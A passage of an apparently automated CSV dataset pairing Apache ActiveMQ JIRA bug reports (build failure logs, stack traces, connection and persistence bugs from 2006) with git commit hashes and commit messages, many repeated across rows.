	at java.lang.Thread.run(Thread.java:570)",e5b7c9fba467d1b9f2db04c01e3863883fd25fc0,"AMQ-6821, AMQ-6790: add the ActiveMQAMQPBrokerFeatureTest to the smoke/sanity test profile"
12481273,AMQ-676,KahaXARecoveryTest fails - fix persistence for XA transactions,56bed30c6427a1cc6b41e0d289a97c3e5b4582c4,"AMQ-6765 Add trace logging of start failure exception

Log the exception at trace level when start fails."
12482083,AMQ-670,It was also setting the content-length as a propertly on the JMS message when receiving a binary message.,b6cb0eacea632239fa6bf3a6c66ba1570c3c9af7,"[AMQ-6702] add maxProducersToAudit and maxAuditDepth to dead letter strategy to cofigure the audit, fix and test"
12482083,AMQ-670,It was also setting the content-length as a propertly on the JMS message when receiving a binary message.,99f3d4c5054bbf401c6460d99574873b604e4b49,"[AMQ-6703] have jmx purge clear the audit such that messages can be copied back, fix and test"
12482083,AMQ-670,It was also setting the content-length as a propertly on the JMS message when receiving a binary message.,314d5a51688186bf1a21bae0137b3e6cee407f43,AMQ-6707 - skip tracked ack dependent test for leveldb
12481286,AMQ-668,"+----------------------------------------
| Executing clean ActiveMQ :: Web
| Memory: 6M/9M
+----------------------------------------
DEPRECATED: the default goal should be specified in the <build> section of project.xml instead of maven.xml
DEPRECATED: the default goal should be specified in the <build> section of project.xml instead of maven.xml

build:end:

Attempting to download rome-.jar.
WARNING: Failed to download rome-.jar.
Attempting to download jdom-.jar.
WARNING: Failed to download jdom-.jar.

BUILD FAILED
File...... /Users/bsnyder/.maven/cache/maven-multiproject-plugin-1.4.1/plugin.jelly
Element... maven:reactor
Line...... 218
Column.... -1
The build cannot continue because of the following unsatisfied dependencies:

rome-.jar
jdom-.jar

Total time   : 1 minutes 21 seconds 
Finished at  : Tuesday, March 28, 2006 1:51:36 PM MST",02d5f187ed05be1b0f6464401a12109041b61bd4,"Applied patch https://issues.apache.org/activemq/browse/AMQ-668
Thanks Bruce!


git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@389608 13f79535-47bb-0310-9956-ffa450edef68"
12481286,AMQ-668,"+----------------------------------------
| Executing clean ActiveMQ :: Web
| Memory: 6M/9M
+----------------------------------------
DEPRECATED: the default goal should be specified in the <build> section of project.xml instead of maven.xml
DEPRECATED: the default goal should be specified in the <build> section of project.xml instead of maven.xml

build:end:

Attempting to download rome-.jar.
WARNING: Failed to download rome-.jar.
Attempting to download jdom-.jar.
WARNING: Failed to download jdom-.jar.

BUILD FAILED
File...... /Users/bsnyder/.maven/cache/maven-multiproject-plugin-1.4.1/plugin.jelly
Element... maven:reactor
Line...... 218
Column.... -1
The build cannot continue because of the following unsatisfied dependencies:

rome-.jar
jdom-.jar

Total time   : 1 minutes 21 seconds 
Finished at  : Tuesday, March 28, 2006 1:51:36 PM MST",7cae60eae0e2835222783c770974d83323dd6a10,[AMQ-6684] exclude json cat-x transitive dep
12481286,AMQ-668,"+----------------------------------------
| Executing clean ActiveMQ :: Web
| Memory: 6M/9M
+----------------------------------------
DEPRECATED: the default goal should be specified in the <build> section of project.xml instead of maven.xml
DEPRECATED: the default goal should be specified in the <build> section of project.xml instead of maven.xml

build:end:

Attempting to download rome-.jar.
WARNING: Failed to download rome-.jar.
Attempting to download jdom-.jar.
WARNING: Failed to download jdom-.jar.

BUILD FAILED
File...... /Users/bsnyder/.maven/cache/maven-multiproject-plugin-1.4.1/plugin.jelly
Element... maven:reactor
Line...... 218
Column.... -1
The build cannot continue because of the following unsatisfied dependencies:

rome-.jar
jdom-.jar

Total time   : 1 minutes 21 seconds 
Finished at  : Tuesday, March 28, 2006 1:51:36 PM MST",44b5d0be658bec973dce4ddfc4be5aae3197925b,[AMQ-6689] placeholder for new logo submissions
12481286,AMQ-668,"+----------------------------------------
| Executing clean ActiveMQ :: Web
| Memory: 6M/9M
+----------------------------------------
DEPRECATED: the default goal should be specified in the <build> section of project.xml instead of maven.xml
DEPRECATED: the default goal should be specified in the <build> section of project.xml instead of maven.xml

build:end:

Attempting to download rome-.jar.
WARNING: Failed to download rome-.jar.
Attempting to download jdom-.jar.
WARNING: Failed to download jdom-.jar.

BUILD FAILED
File...... /Users/bsnyder/.maven/cache/maven-multiproject-plugin-1.4.1/plugin.jelly
Element... maven:reactor
Line...... 218
Column.... -1
The build cannot continue because of the following unsatisfied dependencies:

rome-.jar
jdom-.jar

Total time   : 1 minutes 21 seconds 
Finished at  : Tuesday, March 28, 2006 1:51:36 PM MST",68562a4f865d0d1ab39728fdb4051914e6c30a5b,"AMQ-6689 Added new ActiveMQ Logo files

https://issues.apache.org/jira/browse/AMQ-6689"
12481286,AMQ-668,"+----------------------------------------
| Executing clean ActiveMQ :: Web
| Memory: 6M/9M
+----------------------------------------
DEPRECATED: the default goal should be specified in the <build> section of project.xml instead of maven.xml
DEPRECATED: the default goal should be specified in the <build> section of project.xml instead of maven.xml

build:end:

Attempting to download rome-.jar.
WARNING: Failed to download rome-.jar.
Attempting to download jdom-.jar.
WARNING: Failed to download jdom-.jar.

BUILD FAILED
File...... /Users/bsnyder/.maven/cache/maven-multiproject-plugin-1.4.1/plugin.jelly
Element... maven:reactor
Line...... 218
Column.... -1
The build cannot continue because of the following unsatisfied dependencies:

rome-.jar
jdom-.jar

Total time   : 1 minutes 21 seconds 
Finished at  : Tuesday, March 28, 2006 1:51:36 PM MST",18f91ba136c585193177d8b9e1e8c0ae4d3bd76b,"Merging selected logo as AMQ-6689 from #255
This closes #255
This closes #253
This closes #251
This closes #249
This closes #248
This closes #245
This closes #244
This closes #243
This closes #242"
12481277,AMQ-662,"when a runtime exception in onMessage the messages are getting rolledback/resent as expected, however AMQ appears to go into an infinite loop at this point taking up 100% of the CPU. Turning debug on shows the following repeated:
...
[DEBUG] 2006-03-21 16:55:37,586 - org.apache.activemq.ra.ServerSessionImpl:1 (ServerSessionImpl.java:159)- run loop start
[DEBUG] 2006-03-21 16:55:37,586 - org.apache.activemq.ra.ServerSessionImpl:3 (ServerSessionImpl.java:172)- run loop end
[DEBUG] 2006-03-21 16:55:37,586 - org.apache.activemq.ra.ServerSessionImpl:22 (ServerSessionImpl.java:172)- run loop end
[DEBUG] 2006-03-21 16:55:37,586 - org.apache.activemq.ra.ServerSessionImpl:11 (ServerSessionImpl.java:159)- run loop start
[DEBUG] 2006-03-21 16:55:37,586 - org.apache.activemq.ra.ServerSessionImpl:0 (ServerSessionImpl.java:172)- run loop end
[DEBUG] 2006-03-21 16:55:37,586 - org.apache.activemq.ra.ServerSessionImpl:17 (ServerSessionImpl.java:172)- run loop end
[DEBUG] 2006-03-21 16:55:37,586 - org.apache.activemq.ra.ServerSessionImpl:1 (ServerSessionImpl.java:172)- run loop end 

The resend (and resulting infinte loop) was triggered by throwing a RuntimeException in the onMessage method of the POJO MDB.

This is being used alongside Spring 1.2.7, Jencks 1.1.1 in a POJO message driven bean setup. Attached are the configurations producing the error. 
",d70852eec8b61e4d847b0d191cd88131bc606e23,[AMQ-6625] fix mock test expectation regression
12481217,AMQ-661,"Reported at:
http://www.nabble.com/jaas-t1335403.html#a3568111",2809befff568f5f8c3c16f1a836c229ef4bf95eb,[AMQ-6610] - fix up brittle jmock test
12481357,AMQ-659,"Originally reported on http://www.nabble.com/Message-Redelivery-after-startup%2C-potential-BUG-with-easy-test-case-t1337282.html#a3574070

I confirmed that this is happening.
",e4efa6f47adafeeb6e12c6e62f210b3016544252,[AMQ-6591] Add missing import
12481357,AMQ-659,"Originally reported on http://www.nabble.com/Message-Redelivery-after-startup%2C-potential-BUG-with-easy-test-case-t1337282.html#a3574070

I confirmed that this is happening.
",1d15908e71942ced7e4987273846976753a028f6,"https://issues.apache.org/jira/browse/AMQ-6595

Fixing tar permissions so that everything is 0755 or 0644 as it should
be"
12481624,AMQ-654,"The organization url needs to be corrected as it is currently invalid.

The values for the siteAddress siteDirectory distributionSite and distributionDirectory need to be reviewed.

The mailing list information to need to be updated to point to the apache mailing lists

The mailing list archives could be updated to point to archives that Hiram has requested to be setup on Nabble.",59f27aa48328faff1ce4b18f4a9d0f4950e840c8,[AMQ-6542] Test creation of ConnectionFactory from config
12481624,AMQ-654,"The organization url needs to be corrected as it is currently invalid.

The values for the siteAddress siteDirectory distributionSite and distributionDirectory need to be reviewed.

The mailing list information to need to be updated to point to the apache mailing lists

The mailing list archives could be updated to point to archives that Hiram has requested to be setup on Nabble.",85181d630c94c7ca7a47cbb40fc55e3f9e27b574,"[AMQ-6548] ensure any pending xa transaction is marked rollback only on delivery failure exception from on message, before delegating to potential clientInternalExceptionListener. Variant of patch applied with additional test - thanks to Andrey Dyachikhin for the patch inspiration"
12481624,AMQ-654,"The organization url needs to be corrected as it is currently invalid.

The values for the siteAddress siteDirectory distributionSite and distributionDirectory need to be reviewed.

The mailing list information to need to be updated to point to the apache mailing lists

The mailing list archives could be updated to point to archives that Hiram has requested to be setup on Nabble.",6e17c2a5a29867b3e85b25a9d93a1f27b794f234,"https://issues.apache.org/jira/browse/AMQ-6542

Adding missing license header"
12481600,AMQ-651,"Need to check to see if this is still valid against 4.x
See:
http://issues.apache.org/jira/browse/GERONIMO-1493",00129837dedd010843fe19150adfbfb64e97ced8,[AMQ-6515] Adding javax.inject bundle to fix the issue on feature install
12481600,AMQ-651,"Need to check to see if this is still valid against 4.x
See:
http://issues.apache.org/jira/browse/GERONIMO-1493",e3d698b9d9c5cf97f5d462ee93f7027b97868da6,[AMQ-6515] add explicit no import for ..thirdparty.publicsuffix which leaks from guava via bnd into the activemq-osgi module
12481600,AMQ-651,"Need to check to see if this is still valid against 4.x
See:
http://issues.apache.org/jira/browse/GERONIMO-1493",bee0904b843129992b9dcbc035aa08f970728750,[AMQ-6514] Adding test for activemq blueprint setup and xbean problem
12481659,AMQ-649,"If you send a malformed SEND frame to the server (like having a newline after your payload and before the NULL when using a content-length header), you don't get the ERROR frame back from the server immediately as you did with 3.2.2.  With both 4.0M4 and the SNAPSHOT from March 20, I had to send another message to the server to see the ERROR frame.

This was quite confusing when implementing a new STOMP client.
",dca066287ebd7ffe465544f647e213e1c4d5744a,"https://issues.apache.org/jira/browse/AMQ-6494

Ignoring test that currently fails. The parent test is already ignored
in the build so I'm adding this one to be ignored as well.  It
currently fails on exceptions that are expected and needs to be fixed."
12481659,AMQ-649,"If you send a malformed SEND frame to the server (like having a newline after your payload and before the NULL when using a content-length header), you don't get the ERROR frame back from the server immediately as you did with 3.2.2.  With both 4.0M4 and the SNAPSHOT from March 20, I had to send another message to the server to see the ERROR frame.

This was quite confusing when implementing a new STOMP client.
",d42b51a78e975e6f55ad796b33c84738ccfb57ea,[AMQ-6630][AMQ-6493] fix feature and add explicit 2.0 jms dep to karaf for the amqp client test
12481595,AMQ-647,"I'm currently testing the openwire .NET JMS implementation to communicate with a activemq java broker ; the aim of this test is to evaluate the possibilty to deploy the solution in live environment.

My test platform is quite simple :

* A java JMS publisher publishes 100messages / 1s on a test topic
* A java consumer is listening to this topic
* A openwire consumer listens to the same topic

After a few hundreds messages (about 10-20 seconds of publish), the openwire client hangs and receives no more message. Using the Visual Studio debugger, it appears that the client is waiting on a ""read"" from the socket. The side effect of this is that after a few more seconds, the publisher itself stops to emit messages as if some internal queue becomes full or someting.

I'm fully aware that Openwire is always in a development process but I want to point out that this issue already existed in the previous versions I had tested. This problem prevents using the openwire implementation in a live environment in the current state.",52ab6ba09b0f58ab95ea24c501fff12488decc4e,AMQ-6471 - map groupClass attribute on mod to authorization map. fix and test
12481595,AMQ-647,"I'm currently testing the openwire .NET JMS implementation to communicate with a activemq java broker ; the aim of this test is to evaluate the possibilty to deploy the solution in live environment.

My test platform is quite simple :

* A java JMS publisher publishes 100messages / 1s on a test topic
* A java consumer is listening to this topic
* A openwire consumer listens to the same topic

After a few hundreds messages (about 10-20 seconds of publish), the openwire client hangs and receives no more message. Using the Visual Studio debugger, it appears that the client is waiting on a ""read"" from the socket. The side effect of this is that after a few more seconds, the publisher itself stops to emit messages as if some internal queue becomes full or someting.

I'm fully aware that Openwire is always in a development process but I want to point out that this issue already existed in the previous versions I had tested. This problem prevents using the openwire implementation in a live environment in the current state.",d1f42bd01e90abe3fb171834efd46a3594ba2600,"https://issues.apache.org/jira/browse/AMQ-6474

ASYNC_TASKS executor not being shut down on stop with no other users in
service."
12481549,AMQ-643,"AMQ 4 03/17/2006 SNAPSHOT

Using maxInactivityDuration causes a connection to automatically break after the inactivity duration, even though nothing is wrong with either side of the connection.

Tracing it through, it looks like the KeepAliveInfo command does not require a response.  This means that the KeepAlive sent never results in receive activity.  So, if both processes are perfectly fine, just not sending any data, the connection breaks due to InactivityMonitor.readCheck.

I've changed KeepAliveInfo.java to return true for isResponseRequired.  This seems to fix the problem, from a client perspective, anyway.

However, if this is used for broker-to-broker connections, and you force a problem with one of the brokers (like doing pstop on Solaris), major problems will happen:

1)  The broker that is left alone seems to break the connection.  But, it continues to attempt to send messages to the failed broker.  It was mentioned in the forum at one point you were going to have the broker unregister subscriptions so it would not attempt to send messages to the failed broker.  Doesn't seem like this is in place.

2) If you reawaken the pstopped broker, the two brokers never really recover properly.  Connections continue to get broken, over and over again.
",5702ec8d7ca330c94d6e4b59cea4606285b2c196,"https://issues.apache.org/jira/browse/AMQ-6438

Add additional test for larger more complex AMQP message"
12481549,AMQ-643,"AMQ 4 03/17/2006 SNAPSHOT

Using maxInactivityDuration causes a connection to automatically break after the inactivity duration, even though nothing is wrong with either side of the connection.

Tracing it through, it looks like the KeepAliveInfo command does not require a response.  This means that the KeepAlive sent never results in receive activity.  So, if both processes are perfectly fine, just not sending any data, the connection breaks due to InactivityMonitor.readCheck.

I've changed KeepAliveInfo.java to return true for isResponseRequired.  This seems to fix the problem, from a client perspective, anyway.

However, if this is used for broker-to-broker connections, and you force a problem with one of the brokers (like doing pstop on Solaris), major problems will happen:

1)  The broker that is left alone seems to break the connection.  But, it continues to attempt to send messages to the failed broker.  It was mentioned in the forum at one point you were going to have the broker unregister subscriptions so it would not attempt to send messages to the failed broker.  Doesn't seem like this is in place.

2) If you reawaken the pstopped broker, the two brokers never really recover properly.  Connections continue to get broken, over and over again.
",b1a9a9382b837fb8cff7f9586c7f9516675bf78a,"https://issues.apache.org/jira/browse/AMQ-6438

Add a new test for encode / decode validation.  Fix issue where the
internal scheduled message properties were escaping into the outbound
message."
12481566,AMQ-641,"If I use failover:tcp//.... in the jms client,
That all method will be blocked when net or activemq error.
This  is not a good idea.My application will be blocked. 

And If I use tcp//.... in the jms client,Sometimes ,send(message) method will be blocked,also not return.

 JMS is a asynchronous interface ,blocking is not allow at any condition.",f8bc19b96da752e216de2c5c543a7d8523512a03,AMQ-6413 - ensure audit update on skipped store add for kahadb concurrentStoreAndDispatch. Fix and test
12481566,AMQ-641,"If I use failover:tcp//.... in the jms client,
That all method will be blocked when net or activemq error.
This  is not a good idea.My application will be blocked. 

And If I use tcp//.... in the jms client,Sometimes ,send(message) method will be blocked,also not return.

 JMS is a asynchronous interface ,blocking is not allow at any condition.",a1f6261fb248fd2d39b78e7f2245352009394975,[AMQ-6414] additional test that reproduces and validates
12481566,AMQ-641,"If I use failover:tcp//.... in the jms client,
That all method will be blocked when net or activemq error.
This  is not a good idea.My application will be blocked. 

And If I use tcp//.... in the jms client,Sometimes ,send(message) method will be blocked,also not return.

 JMS is a asynchronous interface ,blocking is not allow at any condition.",b6521e292b20788eef44f3a7810d8e4281b677dc,[AMQ-6414] additional logging that helped identify root cause
12481635,AMQ-640,"Broker networking using http fails. I think the problem is the bridge is sending the BrokerInfo first before the ConnectionInfo (DemandForwardingBridgeSupport:185) without the clientID from the ConnectionInfo, send fails. Failover transport tries to resend, but continue failing. Tried sending the ConnectionInfo first, before the BrokerInfo, and it seems to work ok, aside from a few lost messages. But I'm not sure if this is the way to go.",1030fb184216d00e3fd43a416931acd3b2fc6794,"https://issues.apache.org/jira/browse/AMQ-6404

Add check for unmarshalled text body and handle that case."
12481635,AMQ-640,"Broker networking using http fails. I think the problem is the bridge is sending the BrokerInfo first before the ConnectionInfo (DemandForwardingBridgeSupport:185) without the clientID from the ConnectionInfo, send fails. Failover transport tries to resend, but continue failing. Tried sending the ConnectionInfo first, before the BrokerInfo, and it seems to work ok, aside from a few lost messages. But I'm not sure if this is the way to go.",b6759b33dc5c67dd7c0deaf41abeaecff6f9afe7,"AMQ-6403 - init broker temp from provided temp store to align usage checks. Thanks for the patchh shailendra14k@gmail.com, made a mod to respect broker.tmpDataDirectory as a default. This closes #204"
12481517,AMQ-635,The test suite for Ruby Stomp is not currently working against SVN HEAD of ActiveMQ 4.x,0706fd0bc1f499f1fc304ec1c70aa8aaa3dd4d69,"https://issues.apache.org/jira/browse/AMQ-6350

Allow for PooledConnectionFactory restart after being stopped."
12481517,AMQ-635,The test suite for Ruby Stomp is not currently working against SVN HEAD of ActiveMQ 4.x,a35e8dc8a28768ddf7f14c29cb41fdc6e2e8a605,"https://issues.apache.org/jira/browse/AMQ-6359

Allow a receiver link to enable consumer options on the subscription
such as exclusive and retroactive using options encoded on the address"
12481671,AMQ-632,"When trying to enable dispatchAsync for broker-to-broker connections (which, since I've not found a way to configure demandForwardingBridge in the broker XML, I had to hard code by setting the default value of dispatchAsync in DemandForwardingBridge.java), I found that the TaskRunnerFactory from the broker was not being carried through to the Network connections.

I'm not sure if the way I fixed it is fully acceptable or not, however the attached VMTransportFactory.java seems to fix the issue.  I changed doCompositeConnect to call setTaskRunnerFactory on the newly created TransportConnector.

The change is against SNAPSHOT 03/14/2006.",1b60ebbea5502153c8130a4e4274f90e08ed4035,"Applied patch at: http://jira.activemq.org/jira/browse/AMQ-632

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@387561 13f79535-47bb-0310-9956-ffa450edef68"
12481671,AMQ-632,"When trying to enable dispatchAsync for broker-to-broker connections (which, since I've not found a way to configure demandForwardingBridge in the broker XML, I had to hard code by setting the default value of dispatchAsync in DemandForwardingBridge.java), I found that the TaskRunnerFactory from the broker was not being carried through to the Network connections.

I'm not sure if the way I fixed it is fully acceptable or not, however the attached VMTransportFactory.java seems to fix the issue.  I changed doCompositeConnect to call setTaskRunnerFactory on the newly created TransportConnector.

The change is against SNAPSHOT 03/14/2006.",36237cb30f703664a75e642b8c4f25b020e9a7a9,https://issues.apache.org/jira/browse/AMQ-6322 - fix NetworkRouteTest failure
12482159,AMQ-630,"1.  Bring up a broker
2.  Bring up a client application which connects to the broker
3.  Stop the broker.
4.  Now try to stop the client app -- it will not shutdown until the broker is restarted.  

Using failover:tcp to connect to broker.",76b70545f248e6970245719f2f584298b8d493fd,"https://issues.apache.org/jira/browse/AMQ-6304

Ensure that the broker send a container ID using its assigned Broker
name value."
12481466,AMQ-628,<NA>,e02c1a17f83b21cbf42fa9e6e78a891af3edd8bb,"https://issues.apache.org/jira/browse/AMQ-6286

Create a follow on test showing AMQP respects order."
12481622,AMQ-621,"setup: (1) activemq up running with ssl
            (2) JMS client (application) was compiled purely used sun solaris environment with jdk1.5.0_03 and jms1.1.jar. Debugging mode was turned on.
            (3) use jndi.properties file provided at activemq.

Execution:
         Producer simply sent 1000 text messages with 46 characters each on a queue.
         Consumer use synchrouse receive mode: receive()

Observation:
         (1) Both producer and receiver successfully handsaked with activemq (by looking into logs about ssl certification verification and negociation.
         (2) Producer continuously pushed messages into queue and consumer received messages.
         (3) After several hundred message delivered and received, consumer got null pointer exception as below:
       
         ....
         main, WRITE: TLSv1 Application Data, length = 46
         Client received: No. 450:Sever message: abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz
         Socket Connection: /127.0.0.1:55693 -> localhost/127.0.0.1:61618, READ: TLSv1 Application Data, length = 161
         main, WRITE: TLSv1 Application Data, length = 46
         Client received: No. 451:Sever message: abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz
         Socket Connection: /127.0.0.1:55693 -> localhost/127.0.0.1:61618, READ: TLSv1 Application Data, length = 161
         Mar 8, 2006 2:38:10 PM org.apache.activemq.ActiveMQConnection onAsyncException
         WARNING: Async exception with no exception listener: java.io.IOException: Unexpected Error: java.lang.NullPointerException
        java.io.IOException: Unexpected Error: java.lang.NullPointerException
        at org.activeio.adapter.SyncToAsyncChannel.run(SyncToAsyncChannel.java:161)
        at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:643)
        at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:668)
        at java.lang.Thread.run(Thread.java:595)
Caused by: java.lang.NullPointerException
        at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:146)
        at org.activeio.command.AsyncChannelToAsyncCommandChannel$1.onPacket(AsyncChannelToAsyncCommandChannel.java:69)
        at org.apache.activemq.transport.activeio.PacketAggregatingAsyncChannel.onPacket(PacketAggregatingAsyncChannel.java:92)
        at org.activeio.FilterAsyncChannel.onPacket(FilterAsyncChannel.java:87)
        at org.apache.activemq.transport.activeio.ActivityMonitor.onPacket(ActivityMonitor.java:42)
        at org.activeio.adapter.SyncToAsyncChannel.run(SyncToAsyncChannel.java:155)
        ... 3 more
Socket Connection: /127.0.0.1:55693 -> localhost/127.0.0.1:61618, called close()
Socket Connection: /127.0.0.1:55693 -> localhost/127.0.0.1:61618, called closeInternal(true)
Socket Connection: /127.0.0.1:55693 -> localhost/127.0.0.1:61618, SEND TLSv1 ALERT:  warning, description = close_notify
Socket Connection: /127.0.0.1:55693 -> localhost/127.0.0.1:61618, WRITE: TLSv1 Alert, length = 18
Socket Connection: /127.0.0.1:55693 -> localhost/127.0.0.1:61618, called close()
Socket Connection: /127.0.0.1:55693 -> localhost/127.0.0.1:61618, called closeInternal(true)
Socket Connection: /127.0.0.1:55693 -> localhost/127.0.0.1:61618, called close()
Socket Connection: /127.0.0.1:55693 -> localhost/127.0.0.1:61618, called closeInternal(true)

 







",4bd9a4ef6f29399ebde61275db75cf8d5d323ffc,"https://issues.apache.org/jira/browse/AMQ-6212

Adding spring-messaging to the artifactSet for activemq-all to be
included inside the shaded jar"
12481622,AMQ-621,"setup: (1) activemq up running with ssl
            (2) JMS client (application) was compiled purely used sun solaris environment with jdk1.5.0_03 and jms1.1.jar. Debugging mode was turned on.
            (3) use jndi.properties file provided at activemq.

Execution:
         Producer simply sent 1000 text messages with 46 characters each on a queue.
         Consumer use synchrouse receive mode: receive()

Observation:
         (1) Both producer and receiver successfully handsaked with activemq (by looking into logs about ssl certification verification and negociation.
         (2) Producer continuously pushed messages into queue and consumer received messages.
         (3) After several hundred message delivered and received, consumer got null pointer exception as below:
       
         ....
         main, WRITE: TLSv1 Application Data, length = 46
         Client received: No. 450:Sever message: abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz
         Socket Connection: /127.0.0.1:55693 -> localhost/127.0.0.1:61618, READ: TLSv1 Application Data, length = 161
         main, WRITE: TLSv1 Application Data, length = 46
         Client received: No. 451:Sever message: abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz
         Socket Connection: /127.0.0.1:55693 -> localhost/127.0.0.1:61618, READ: TLSv1 Application Data, length = 161
         Mar 8, 2006 2:38:10 PM org.apache.activemq.ActiveMQConnection onAsyncException
         WARNING: Async exception with no exception listener: java.io.IOException: Unexpected Error: java.lang.NullPointerException
        java.io.IOException: Unexpected Error: java.lang.NullPointerException
        at org.activeio.adapter.SyncToAsyncChannel.run(SyncToAsyncChannel.java:161)
        at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:643)
        at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:668)
        at java.lang.Thread.run(Thread.java:595)
Caused by: java.lang.NullPointerException
        at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:146)
        at org.activeio.command.AsyncChannelToAsyncCommandChannel$1.onPacket(AsyncChannelToAsyncCommandChannel.java:69)
        at org.apache.activemq.transport.activeio.PacketAggregatingAsyncChannel.onPacket(PacketAggregatingAsyncChannel.java:92)
        at org.activeio.FilterAsyncChannel.onPacket(FilterAsyncChannel.java:87)
        at org.apache.activemq.transport.activeio.ActivityMonitor.onPacket(ActivityMonitor.java:42)
        at org.activeio.adapter.SyncToAsyncChannel.run(SyncToAsyncChannel.java:155)
        ... 3 more
Socket Connection: /127.0.0.1:55693 -> localhost/127.0.0.1:61618, called close()
Socket Connection: /127.0.0.1:55693 -> localhost/127.0.0.1:61618, called closeInternal(true)
Socket Connection: /127.0.0.1:55693 -> localhost/127.0.0.1:61618, SEND TLSv1 ALERT:  warning, description = close_notify
Socket Connection: /127.0.0.1:55693 -> localhost/127.0.0.1:61618, WRITE: TLSv1 Alert, length = 18
Socket Connection: /127.0.0.1:55693 -> localhost/127.0.0.1:61618, called close()
Socket Connection: /127.0.0.1:55693 -> localhost/127.0.0.1:61618, called closeInternal(true)
Socket Connection: /127.0.0.1:55693 -> localhost/127.0.0.1:61618, called close()
Socket Connection: /127.0.0.1:55693 -> localhost/127.0.0.1:61618, called closeInternal(true)

 







",ea09159a4087212964787e7cf68ef30170d115f0,"https://issues.apache.org/jira/browse/AMQ-6218

Fixing copy method of ActiveMQTextMessage to prevent a race condition
when concurrent store and dispatch is used with Queues

We may need explicity synchronization between the text and content fields
in the future if other issues pop up"
12481516,AMQ-618,"
When streaming large amounts of data (that exceed the VM's permitted maximum), an OutOfMemoryError is thrown.

Turning on persistence (changing BROKER_URL to ""vm://localhost?broker.persistent=true"") seems to work, but I'd like to stream without taking the persistence hit.

",e375af3810aa3ae0cc87c9a4b7400e9730ad65c2,"https://issues.apache.org/jira/browse/AMQ-6182

Adding missing License header"
12481468,AMQ-613,<NA>,a3fa0da6ec67d8b052b52e55b77e41007e787809,https://issues.apache.org/jira/browse/AMQ-6130 - java beans @Transient annotation
12481493,AMQ-612,"This would be an edge case, since it would be odd that the endpoint factory never creates and endpoint, but it could happen if the endpoint factory is invalid for some reason.",1ae29382e12dd9704d78f12b7948b442005ce086,"https://issues.apache.org/jira/browse/AMQ-6129

Fixing DynamicallyIncludedDestinationsDuplexNetworkTest"
12481514,AMQ-611,"We are seeing a problem with a IOException from the FileDataBlock when running with multiple slow clients. It appears to be happening because the DataContainer write(byte[]) operation sets the readBlock and writes the data block length then data block content. Another thread sees the read block and reads the data block length but the write thread has not written the contents yet so an IOException or EOFException is thrown in the read thread (in readFully). The write method is synchronized but the read method is not.

See: FileDataBlock.read, FileDataBlock.write,  DataContainer.write (line 111),  and DataContainer.read (line 131)

I can reproduce the error reliably in a debugger by controlling the order of the operations. Unfortunately it's difficult to write a repeatable automated test case since this is a race condition type of error.

Let me know if you need more information.",43d493e527ccd7d940858646d37819d3bda0a806,"https://issues.apache.org/jira/browse/AMQ-6112

Fixing file permissions in assembly tar.  Some permissions were not
being set explicitly which means the value used could change depending
on where the assembly was built. Permissions are now being set to fix
this."
12481514,AMQ-611,"We are seeing a problem with a IOException from the FileDataBlock when running with multiple slow clients. It appears to be happening because the DataContainer write(byte[]) operation sets the readBlock and writes the data block length then data block content. Another thread sees the read block and reads the data block length but the write thread has not written the contents yet so an IOException or EOFException is thrown in the read thread (in readFully). The write method is synchronized but the read method is not.

See: FileDataBlock.read, FileDataBlock.write,  DataContainer.write (line 111),  and DataContainer.read (line 131)

I can reproduce the error reliably in a debugger by controlling the order of the operations. Unfortunately it's difficult to write a repeatable automated test case since this is a race condition type of error.

Let me know if you need more information.",5b73ffad6bd000fdad93bc473900b2374d36181a,"https://issues.apache.org/jira/browse/AMQ-6117

Test to try and reproduce the issue."
12481514,AMQ-611,"We are seeing a problem with a IOException from the FileDataBlock when running with multiple slow clients. It appears to be happening because the DataContainer write(byte[]) operation sets the readBlock and writes the data block length then data block content. Another thread sees the read block and reads the data block length but the write thread has not written the contents yet so an IOException or EOFException is thrown in the read thread (in readFully). The write method is synchronized but the read method is not.

See: FileDataBlock.read, FileDataBlock.write,  DataContainer.write (line 111),  and DataContainer.read (line 131)

I can reproduce the error reliably in a debugger by controlling the order of the operations. Unfortunately it's difficult to write a repeatable automated test case since this is a race condition type of error.

Let me know if you need more information.",186b5d0f305ed63b23a1db712a933aa4896006cf,"https://issues.apache.org/jira/browse/AMQ-6113

Properly set the X-FRAME-OPTIONS header on web responses."
12481590,AMQ-602,"During long-term operation, a remote, publish-only client with a TCP socket connection to the JMS broker will occasionally be disconnected at a low level (i.e. below the application level where JMS runs).  When this occurs, the JMS broker throws an exception indicating a broken socket, but does not release the clientID of the client to allow for reconnects.  The following stack traces should demonstrate this failure mode:

 INFO  Service                        - Async error occurred: java.net.SocketException: Connection reset
java.net.SocketException: Connection reset
        at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:96)
        at java.net.SocketOutputStream.write(SocketOutputStream.java:136)
        at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:108)
        at java.io.DataOutputStream.flush(DataOutputStream.java:106)
        at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:118)
        at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:90)
        at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:65)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)
        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)
        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:212)
        at org.apache.activemq.broker.AbstractConnection.dispatchSync(AbstractConnection.java:517)
        at org.apache.activemq.broker.AbstractConnection.dispatchAsync(AbstractConnection.java:535)
        at org.apache.activemq.broker.region.TopicSubscription.dispatch(TopicSubscription.java:142)
